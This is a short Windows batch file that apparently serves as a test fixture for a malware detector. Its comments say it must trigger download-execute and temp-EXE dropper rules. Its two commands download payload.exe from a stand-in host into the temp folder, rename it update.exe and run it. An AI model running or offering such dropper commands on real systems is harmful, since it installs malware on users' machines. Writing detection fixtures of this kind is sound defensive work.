@echo off
REM Hand-written temp-EXE dropper: no vendor markers anywhere, so the
REM suspicious download-execute composite and the hostile temp-EXE dropper
REM must both keep firing here.
curl -fsSL "http://evil.example.invalid/payload.exe" -o "%TEMP%\update.exe"
start "" "%TEMP%\update.exe"
